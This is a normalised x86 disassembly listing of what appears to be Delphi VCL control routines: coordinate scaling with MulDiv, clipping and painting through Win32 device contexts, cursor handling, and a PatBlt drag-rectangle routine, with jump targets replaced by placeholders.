je r-xdata
lea ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
mov si 0xffc5
call sub_40338c
jmp r-xdata
mov eax [ ebx + 0x178 ]
mov edx [ ebp - 0x4 ]
call sub_418314
sub_44ca9c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ r-xdata ]
call sub_40331c
test al al
jne r-xdata
cmp esi [ ebx + 0x30 ]
je r-xdata
xor ecx ecx
mov dl [ ebx + 0x57 ]
mov eax ebx
call sub_44d5d4
mov edx edi
mov eax ebx
call sub_44cb4c
mov edx edi
mov eax ebx
call sub_44e3e4
jmp r-xdata
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
cmp esi 0xffffffff
jne r-xdata
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
sub_44cb08
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x1
jne r-xdata
lea eax [ ebx + 0x154 ]
mov edx esi
call sub_403f74
pop esi
pop ebx
retn
mov [ ebx + 0x150 ] 0x0
sub_44cb4c
push ebx
push esi
push edi
push ebp
mov esi eax
mov eax [ edx + 0x8 ]
mov edi [ edx ]
sub eax edi
push eax
mov eax [ edx + 0xc ]
mov ebp [ edx + 0x4 ]
sub eax ebp
push eax
mov ecx ebp
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x84 ]
pop ebp
pop edi
pop esi
pop ebx
retn
sub_44cba8
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax ebx
call sub_44cbd4
mov edx eax
mov ecx esp
mov eax esi
call sub_416e0c
mov edx esp
mov eax ebx
call sub_44d018
pop ecx
pop edx
pop esi
pop ebx
retn
sub_44cbec
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax ebx
call sub_44cb90
mov ecx esp
mov edx esi
call sub_416e0c
mov edx esp
mov eax ebx
call sub_44d018
pop ecx
pop edx
pop esi
pop ebx
retn
sub_44cc14
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_44cc95
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebx + 0x40 ]
add [ esi ] eax
mov eax [ ebx + 0x44 ]
add [ esi + 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44cc9c
lea eax [ ebp - 0xc ]
call sub_403f20
retn
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405c50
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b8a0
call sub_40395c
sub_44cca4
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ esi ]
add eax [ esp ]
mov [ edi ] eax
mov eax [ esi + 0x4 ]
add eax [ esp + 0x4 ]
mov [ edi + 0x4 ] eax
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_44ccd0
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ esi ]
sub eax [ esp ]
mov [ edi ] eax
mov eax [ esi + 0x4 ]
sub eax [ esp + 0x4 ]
mov [ edi + 0x4 ] eax
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_44ccfc
push ebx
push esi
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_40331c
test al al
je r-xdata
mov ebx [ ebx + 0x30 ]
test ebx ebx
jne r-xdata
mov edx esi
mov eax ebx
call sub_4685f0
sub_44cd2c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebx + 0xa0 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp [ rw-data ] 0x0
jne r-xdata
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
mov [ ebp - 0x10 ] edi
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x10 ]
push eax
mov ecx ebx
mov edx 0xb042
mov eax esi
call sub_44e340
sub_44cda8
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp ] ecx
mov edi edx
mov esi eax
cmp edi [ esp ]
je r-xdata
mov al [ r-xdata ]
mov [ esi + 0x98 ] al
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
test [ esi + 0x1c ] 0x1
je r-xdata
mov bl [ r-xdata ]
mov bl [ esi + 0x98 ]
jmp r-xdata
mov ebp [ esi + 0x40 ]
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x40 ]
push eax
call MulDiv
mov ebp eax
jmp r-xdata
test bl 0x1
je r-xdata
mov eax [ esi + 0x44 ]
mov [ esp + 0x4 ] eax
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x44 ]
push eax
call MulDiv
mov [ esp + 0x4 ] eax
jmp r-xdata
test bl 0x2
je r-xdata
mov eax [ esi + 0x48 ]
mov [ esp + 0x8 ] eax
test [ esi + 0x51 ] 0x1
jne r-xdata
test bl 0x4
je r-xdata
mov eax [ esi + 0x4c ]
mov [ esp + 0xc ] eax
test [ esi + 0x51 ] 0x2
jne r-xdata
test bl 0x1
je r-xdata
mov eax ebx
and al [ r-xdata ]
mov dl [ r-xdata ]
cmp dl al
je r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x90 ]
push eax
call MulDiv
mov [ esi + 0x90 ] eax
test bl 0x8
setne dl
test al al
je r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x48 ]
push eax
call MulDiv
mov [ esp + 0x8 ] eax
jmp r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x40 ]
add eax [ esi + 0x48 ]
push eax
call MulDiv
sub eax ebp
mov [ esp + 0x8 ] eax
jmp r-xdata
cmp [ esi + 0x59 ] 0x0
jne r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x94 ]
push eax
call MulDiv
mov [ esi + 0x94 ] eax
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x44 ]
push eax
call MulDiv
mov [ esp + 0xc ] eax
jmp r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x44 ]
add eax [ esi + 0x4c ]
push eax
call MulDiv
sub eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
jmp r-xdata
test bl 0x8
setne al
test al al
je r-xdata
test bl 0x10
je r-xdata
mov eax [ esp + 0x8 ]
push eax
mov eax [ esp + 0x10 ]
push eax
mov ecx [ esp + 0xc ]
mov edx ebp
mov eax esi
mov ebp [ eax ]
call [ ebp + 0x84 ]
mov eax ebx
and al [ r-xdata ]
mov dl [ r-xdata ]
cmp dl al
je r-xdata
mov eax [ esp ]
push eax
push edi
mov ebx [ esi + 0x68 ]
mov eax ebx
call sub_423cc4
push eax
call MulDiv
mov edx eax
mov eax ebx
call sub_423ce0
sub_44cf74
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_44d00a
push [ fs : eax ]
mov [ fs : eax ] esp
test [ edi + 0x50 ] 0x20
je r-xdata
xor ebx ebx
jmp r-xdata
test [ edi + 0x1c ] 0x1
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_420cac
test bl bl
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
call sub_44d18c
mov edx [ ebp - 0x8 ]
mov eax [ edi + 0x8 ]
call sub_40432c
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44d011
lea eax [ ebp - 0x8 ]
call sub_403f20
retn
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_44d1bc
mov esi [ edi + 0x4 ]
test esi esi
je r-xdata
mov bl 0x1
mov eax esi
mov edx [ r-xdata ]
call sub_40331c
test al al
je r-xdata
test [ esi + 0x1c ] 0x1
je r-xdata
sub_44d018
push ebx
push esi
push edi
add esp 0xffffffe8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
lea edx [ esp + 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebx + 0x48 ]
sub eax [ esp + 0x10 ]
add eax [ esp ]
push eax
mov eax [ ebx + 0x4c ]
sub eax [ esp + 0x18 ]
add eax [ esp + 0x8 ]
push eax
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x40 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x84 ]
add esp 0x18
pop edi
pop esi
pop ebx
retn
sub_44d060
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x30 ]
je r-xdata
pop esi
pop ebx
retn
cmp ebx esi
jne r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b920
call sub_40395c
test esi esi
je r-xdata
mov edx ebx
call sub_450700
mov edx ebx
mov eax esi
call sub_45062c
mov eax ebx
call sub_44c7e0
sub_44d0ac
push ebx
push esi
push edi
mov ebx edx
mov edi eax
cmp bl [ edi + 0x57 ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
mov si 0xffcd
call sub_40338c
mov [ edi + 0x57 ] bl
push 0x0
xor ecx ecx
mov cl bl
mov edx 0xb00b
mov eax edi
call sub_44e340
mov eax edi
mov si 0xffd0
call sub_40338c
sub_44d144
push ebx
push esi
mov esi edx
mov ebx eax
mov [ ebx + 0x7c ] esi
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
call sub_461564
mov edx ebx
mov eax esi
call sub_420824
sub_44d168
push ebx
mov ebx eax
push edx
xor ecx ecx
mov eax ebx
mov edx 0xc
call sub_44e340
push 0x0
xor ecx ecx
mov edx 0xb012
mov eax ebx
call sub_44e340
pop ebx
retn
sub_44d18c
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_44d100
mov ebx eax
mov eax edi
mov ecx ebx
xor edx edx
call sub_404010
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
lea ecx [ ebx + 0x1 ]
mov edx [ edi ]
mov eax esi
call sub_44d110
sub_44d1bc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_44d211
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_44d18c
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_40432c
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44d218
lea eax [ ebp - 0x4 ]
call sub_403f20
retn
mov eax esi
call sub_4043e0
mov edx eax
mov eax ebx
call sub_44d168
sub_44d23c
push ebx
mov ebx eax
mov [ ebx + 0x59 ] 0x0
mov [ ebx + 0x56 ] 0x0
mov eax [ ebx + 0x68 ]
call sub_423c20
cmp eax [ ebx + 0x84 ]
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb00e
mov eax ebx
call sub_44e340
pop ebx
retn
or [ ebx + 0x98 ] 0x10
mov eax [ ebx + 0x68 ]
call sub_423c20
mov [ ebx + 0x84 ] eax
sub_44d3c4
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_44d3b4
cmp bl al
je r-xdata
pop esi
pop ebx
retn
test bl bl
je r-xdata
xor eax eax
call sub_44a35c
mov eax esi
call sub_44a35c
jmp r-xdata
sub_44d3fc
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ eax + 0x198 ]
mov edx ebx
call sub_4184cc
test eax eax
jl r-xdata
mov edx [ ebx + 0x30 ]
mov edi [ edx + 0x198 ]
mov edx [ edi + 0x8 ]
test esi esi
jge r-xdata
cmp edx esi
jg r-xdata
xor esi esi
cmp eax esi
je r-xdata
mov esi edx
dec esi
mov edx edi
xchg edx eax
call sub_418360
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x198 ]
mov ecx ebx
mov edx esi
call sub_4184ec
mov cl 0x1
mov dl [ ebx + 0x57 ]
mov eax ebx
call sub_44d5d4
mov eax ebx
call sub_464540
test [ eax + 0x54 ] 0x4
je r-xdata
mov dl 0x1
mov si 0xffd1
call sub_40338c
sub_44d47c
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
retn
test dl dl
je r-xdata
xor edx edx
call sub_44d3fc
mov edx [ ecx + 0x198 ]
mov edx [ edx + 0x8 ]
dec edx
call sub_44d3fc
jmp r-xdata
sub_44d4a0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_44d536
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
mov eax [ ebx + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov esi eax
push 0x0
mov eax [ ebx + 0x44 ]
push eax
mov eax [ ebx + 0x40 ]
push eax
push esi
call SetViewportOrgEx
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
push esi
call IntersectClipRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44d53d
lea eax [ ebp - 0xc ]
call sub_403f20
retn
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405c50
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b8a0
call sub_40395c
sub_44d548
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x1 ] 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
mov edi [ eax + 0x198 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov eax edi
call sub_4184cc
mov esi eax
test esi esi
jle r-xdata
mov [ ebp - 0x1 ] 0x0
dec esi
mov edx esi
mov eax edi
call sub_418470
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
test esi esi
jg r-xdata
test [ ebx + 0x50 ] 0x40
je r-xdata
lea edx [ ebp - 0x24 ]
mov eax ebx
call sub_44cb2c
lea eax [ ebp - 0x24 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
push eax
lea eax [ ebp - 0x11 ]
push eax
call IntersectRect
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
push eax
lea eax [ ebp - 0x11 ]
push eax
call EqualRect
test eax eax
jne r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44d5d4
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0x15 ] cl
mov ebx edx
mov [ ebp - 0x4 ] eax
test bl bl
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_453d8c
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_44cb2c
cmp [ ebp - 0x15 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
test [ eax + 0x50 ] 0x40
jne r-xdata
neg al
sbb eax eax
push eax
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_453a88
push eax
call InvalidateRect
push ebp
call sub_44d548
pop ecx
test al al
je r-xdata
mov al 0x1
sub_44d670
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax ebx
call sub_464518
mov esi eax
test esi esi
je r-xdata
mov eax [ edi + 0x8 ]
push eax
mov ecx [ edi + 0x4 ]
mov edx 0xb043
mov eax ebx
call sub_44e340
mov [ edi + 0xc ] eax
cmp ebx esi
je r-xdata
mov edx edi
mov eax esi
mov si 0xffc9
call sub_40338c
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_44d6d4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_453d8c
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x50 ] 0x40
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x88 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_453a88
push eax
call GetDC
mov [ ebp - 0x8 ] eax
xor ecx ecx
push ebp
push sub_44d7ad
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x44 ]
mov ecx edx
mov ebx [ ebp - 0x4 ]
add ecx [ ebx + 0x4c ]
push ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov ecx eax
mov ebx [ ebp - 0x4 ]
add ecx [ ebx + 0x48 ]
push ecx
push edx
push eax
mov eax [ ebp - 0x8 ]
push eax
call IntersectClipRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
call sub_451894
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_453a88
push eax
call ReleaseDC
retn
sub_44d834
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
mov ebx edx
mov edi eax
mov eax edi
mov edx [ r-xdata ]
call sub_40331c
test al al
je r-xdata
mov eax edi
call sub_44e374
cmp [ rw-data ] 0x0
je r-xdata
cmp [ edi + 0x9b ] 0x1
je r-xdata
xor eax eax
mov [ rw-data ] eax
test [ edi + 0x54 ] 0x1
je r-xdata
cmp [ rw-data ] 0xffffffff
jne r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b920
call sub_40395c
test esi esi
jge r-xdata
push esp
call GetCursorPos
lea ecx [ esp + 0x8 ]
mov edx esp
mov eax edi
call sub_44ccd0
mov eax [ esp + 0x8 ]
mov [ esp ] eax
mov eax [ esp + 0xc ]
mov [ esp + 0x4 ] eax
mov eax esp
call sub_406b14
push eax
xor ecx ecx
mov edx 0x202
mov eax edi
call sub_44e340
add esp 0x10
pop edi
pop esi
pop ebx
retn
cmp [ rw-data ] 0xffffffff
je r-xdata
mov eax [ rw-data ]
mov esi [ eax + 0x8 ]
mov ecx esi
mov edx ebx
mov eax edi
call sub_44b4dc
sub_44d908
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov [ esi ] 0x0
cmp [ eax + 0xf2 ] 0x0
je r-xdata
pop esi
pop ebx
pop ebp
retn 0xc
mov [ esi ] 0x1
push ecx
mov ecx [ ebp + 0x10 ]
push ecx
mov cl [ ebp + 0xc ]
push ecx
push esi
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xf4 ]
call [ ebx + 0xf0 ]
sub_44d944
push ebp
mov ebp esp
push ebx
cmp [ eax + 0xea ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xec ]
call [ ebx + 0xe8 ]
sub_44d990
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x11a ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x11c ]
call [ ebx + 0x118 ]
sub_44d9bc
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov ebx edx
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x38 ]
call sub_44d130
mov edi eax
mov eax [ ebx + 0x38 ]
call sub_44d11c
mov ebp eax
mov [ esp + 0x10 ] edi
fild [ esp + 0x10 ]
fmul [ ebx + 0x20 ]
fild [ ebx + 0xc ]
fsubrp st1
fstp [ esp ]
fwait
mov [ esp + 0x10 ] ebp
fild [ esp + 0x10 ]
fmul [ ebx + 0x28 ]
fild [ ebx + 0x10 ]
fsubrp st1
fstp [ esp + 0x8 ]
fwait
lea esi [ ebx + 0x44 ]
fld [ esp ]
call sub_402960
mov [ esi ] eax
fld [ esp + 0x8 ]
call sub_402960
mov [ esi + 0x4 ] eax
add edi [ esi ]
mov [ esi + 0x8 ] edi
add ebp [ esi + 0x4 ]
mov [ esi + 0xc ] ebp
lea edx [ ebx + 0x44 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x2c ]
jmp r-xdata
mov eax [ ebx + 0x4 ]
cmp [ eax + 0x1a7 ] 0x0
jne r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
lea eax [ ebx + 0x44 ]
push eax
mov eax [ ebx + 0x4 ]
call sub_453a88
push eax
call GetWindowRect
mov eax [ ebx + 0x4 ]
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
cmp [ eax + 0x17c ] 0x0
je r-xdata
mov dl [ ebx + 0x54 ]
push edx
lea edx [ ebx + 0x44 ]
push edx
mov eax [ eax + 0x17c ]
mov ecx [ ebx + 0x58 ]
mov edx [ ebx + 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
sub_44daa0
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x10a ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x10c ]
call [ ebx + 0x108 ]
sub_44daec
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
lea edi [ ebp - 0x9 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov [ ebp - 0xa ] 0x0
cmp [ ebx + 0x13a ] 0x0
je r-xdata
cmp [ ebp - 0xa ] 0x0
jne r-xdata
push esi
lea eax [ ebp - 0x9 ]
push eax
lea eax [ ebp - 0xa ]
push eax
mov cl [ ebp - 0x1 ]
mov edx ebx
mov eax [ ebx + 0x13c ]
call [ ebx + 0x138 ]
mov al [ ebp - 0xa ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
add [ ebx + 0xa4 ] esi
jmp r-xdata
mov ecx [ ebx + 0xa4 ]
mov eax ecx
cdq
xor eax edx
sub eax edx
cmp eax 0x78
jge r-xdata
test ecx ecx
setl al
mov ecx eax
mov eax [ ebx + 0xa4 ]
cdq
xor eax edx
sub eax edx
mov esi eax
sub esi 0x78
mov [ ebx + 0xa4 ] esi
test cl cl
je r-xdata
lea ecx [ ebp - 0x9 ]
mov dl [ ebp - 0x1 ]
mov eax ebx
mov si 0xffe0
call sub_40338c
mov [ ebp - 0xa ] al
test esi esi
je r-xdata
lea ecx [ ebp - 0x9 ]
mov dl [ ebp - 0x1 ]
mov eax ebx
mov si 0xffe1
call sub_40338c
mov [ ebp - 0xa ] al
jmp r-xdata
neg esi
mov [ ebx + 0xa4 ] esi
sub_44dbb0
push ebx
push esi
push edi
add esp 0xfffffff4
mov esi ecx
lea edi [ esp + 0x1 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ esp ] dl
mov [ esp + 0x9 ] 0x0
cmp [ eax + 0x142 ] 0x0
je r-xdata
mov al [ esp + 0x9 ]
add esp 0xc
pop edi
pop esi
pop ebx
retn
lea edx [ esp + 0x1 ]
push edx
lea edx [ esp + 0xd ]
push edx
mov ebx eax
mov cl [ esp + 0x8 ]
mov edx eax
mov eax [ ebx + 0x144 ]
call [ ebx + 0x140 ]
sub_44dbfc
push ebx
push esi
push edi
add esp 0xfffffff4
mov esi ecx
lea edi [ esp + 0x1 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ esp ] dl
mov [ esp + 0x9 ] 0x0
cmp [ eax + 0x14a ] 0x0
je r-xdata
mov al [ esp + 0x9 ]
add esp 0xc
pop edi
pop esi
pop ebx
retn
lea edx [ esp + 0x1 ]
push edx
lea edx [ esp + 0xd ]
push edx
mov ebx eax
mov cl [ esp + 0x8 ]
mov edx eax
mov eax [ ebx + 0x14c ]
call [ ebx + 0x148 ]
sub_44dc48
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov esi edx
mov eax esi
mov edx [ eax ]
call [ edx + 0x38 ]
mov ebx eax
cmp [ ebp - 0x1 ] 0x0
je r-xdata
push esi
add esi 0x44
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
push esi
add esi 0x5c
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
jmp r-xdata
call GetDesktopWindow
mov [ ebp - 0x8 ] eax
push 0x402
push 0x0
mov eax [ ebp - 0x8 ]
push eax
call GetDCEx
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_44dd63
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x40 ]
call sub_424240
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov [ ebp - 0x10 ] eax
push 0x5a0049
push ebx
mov eax [ ebp - 0x18 ]
mov esi [ ebp - 0x20 ]
sub eax esi
sub eax ebx
push eax
mov edi [ ebp - 0x1c ]
push edi
mov eax esi
add eax ebx
push eax
mov eax [ ebp - 0xc ]
push eax
call PatBlt
push 0x5a0049
mov eax [ ebp - 0x14 ]
sub eax edi
sub eax ebx
push eax
push ebx
mov eax edi
add eax ebx
push eax
mov eax [ ebp - 0x18 ]
sub eax ebx
push eax
mov eax [ ebp - 0xc ]
push eax
call PatBlt
push 0x5a0049
push ebx
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x20 ]
sub eax ebx
push eax
mov eax [ ebp - 0x14 ]
sub eax ebx
push eax
push esi
mov eax [ ebp - 0xc ]
push eax
call PatBlt
push 0x5a0049
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x1c ]
sub eax ebx
push eax
push ebx
push edi
push esi
mov eax [ ebp - 0xc ]
push eax
call PatBlt
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44dd6a
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call ReleaseDC
retn
sub_44dd9c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov edi edx
mov [ esp ] eax
mov ebp [ edi + 0x8 ]
mov esi [ ebp + 0x8 ]
mov eax esi
mov edx [ r-xdata ]
call sub_40331c
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
lea ecx [ esp + 0x5 ]
mov edx ebp
mov eax [ esp ]
call sub_44ccd0
mov al [ edi + 0x4 ]
sub al 0x3
jb r-xdata
test bl bl
jne r-xdata
mov [ esp + 0x4 ] 0x1
test bl bl
je r-xdata
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_403340
mov esi [ eax + 0x38 ]
mov eax [ esp + 0x9 ]
push eax
mov al [ edi + 0x4 ]
push eax
lea eax [ esp + 0xc ]
